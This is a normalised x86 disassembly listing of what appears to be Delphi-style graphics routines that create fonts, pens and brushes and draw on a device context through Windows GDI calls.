pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_41cc98
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41c26c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_41ccdc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414500
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c99c
xor eax eax
push ebp
push sub_41cd97
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c99c
xor eax eax
push ebp
push sub_41cd7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c394
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41ce18
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cd81
mov eax [ ebp - 0x8 ]
call sub_41c9ac
retn
mov eax ebx
call sub_41d09c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41d0b8
sub_41cdc8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c99c
xor eax eax
push ebp
push sub_41ce0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c31c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ce14
mov eax [ ebp - 0x4 ]
call sub_41c9ac
retn
sub_41ce2c
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41cfb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cfbc
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403fcc
retn
mov eax [ rw-data ]
call sub_41c170
xor eax eax
push ebp
push sub_41cf8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41c17c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40420c
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_408774
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_40420c
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_408774
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40420c
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407de0
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_41d110
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_41cfd4
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_41cb90
mov edx esp
mov eax ebx
call sub_41cdc8
add esp 0x2c
pop esi
pop ebx
retn
sub_41d000
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41cdb0
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41cdc8
add esp 0x2c
pop esi
pop ebx
retn
sub_41d040
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41cdb0
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402c64
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404244
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402b54
mov edx esp
mov eax ebx
call sub_41cdc8
sub_41d0b8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_41d000
pop esi
pop ebx
retn
sub_41d0e4
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41cdb0
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41cdc8
add esp 0x30
pop ebx
retn
sub_41d118
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41cdb0
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_41cdc8
add esp 0x2c
pop esi
pop ebx
retn
sub_41d148
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41cdb0
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_41cdc8
add esp 0x2c
pop esi
pop ebx
retn
sub_41d170
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41c188
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_41d1b4
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41c26c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_41d1dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414500
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c99c
xor eax eax
push ebp
push sub_41d27b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c99c
xor eax eax
push ebp
push sub_41d25e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c394
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41d3c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d265
mov eax [ ebp - 0x8 ]
call sub_41c9ac
retn
sub_41d294
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41d2ac
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c99c
xor eax eax
push ebp
push sub_41d2f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c31c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d2f8
mov eax [ ebp - 0x4 ]
call sub_41c9ac
retn
sub_41d304
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41d294
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41d2ac
add esp 0x10
pop esi
pop ebx
retn
sub_41d32c
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41c170
xor eax eax
push ebp
push sub_41d3b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41c17c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c958
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_41d3e0
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41d294
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_41d2ac
add esp 0x10
pop esi
pop ebx
retn
sub_41d410
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41d294
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_41d2ac
sub_41d43c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41c188
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_41d47c
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41c26c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_41d4a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414500
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c99c
xor eax eax
push ebp
push sub_41d534
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c99c
xor eax eax
push ebp
push sub_41d517
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c394
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d51e
mov eax [ ebp - 0x8 ]
call sub_41c9ac
retn
sub_41d54c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_41d568
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c99c
xor eax eax
push ebp
push sub_41d5ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c31c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d5b4
mov eax [ ebp - 0x4 ]
call sub_41c9ac
retn
sub_41d5b8
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_41d568
add esp 0x10
pop edi
pop esi
retn
sub_41d5e4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41d54c
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_41d568
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_41d618
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41c170
xor edx edx
push ebp
push sub_41d6e5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41c17c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c958
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_41d700
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41d54c
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_41d568
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_41d734
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403228
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cc44
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41df74
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d170
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41df94
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d43c
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41dfb4
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_414228
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_41d7f8
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_4142c4
xor edx edx
mov eax esi
call sub_41ddac
mov eax [ esi + 0xc ]
call sub_403258
mov eax [ esi + 0x10 ]
call sub_403258
mov eax [ esi + 0x14 ]
call sub_403258
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4144d4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_41d854
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41de00
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41de00
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41d8dc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41de00
mov eax [ ebx + 0x14 ]
call sub_41d5dc
call sub_41c958
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c958
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_412b10
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d988
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41de00
mov eax [ ebx + 0x14 ]
call sub_41d618
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d9c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41de00
mov eax [ ebx + 0x14 ]
call sub_41d618
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41da00
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41de00
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41da60
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41de00
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_41da8c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41de00
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41dac4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41de00
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41db0c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41de00
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41db48
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41de00
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_404268
push eax
mov eax edi
call sub_404468
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_41db8c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41db48
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41dba8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41db48
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41dbc8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41dc14
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dc1b
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_41da38
sub_41dc74
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41de00
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_41dc98
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_41da60
pop ecx
pop edx
pop edi
pop esi
retn
sub_41dcb8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41de00
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_41dce4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41de00
mov eax [ ebp + 0x8 ]
call sub_41c958
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41dd4c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_41ddac
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_41dd4c
mov edx esp
mov eax ebx
call sub_41dc74
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_41dc98
sub_41de00
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_41de9c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
test bl 0x8
je r-xdata
mov eax esi
call sub_41dec8
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_41def8
sub_41de9c
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_41ce2c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c958
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_41dec8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41d32c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_41def8
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_41d618
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_41d618
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_41d6f8
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_41d5dc
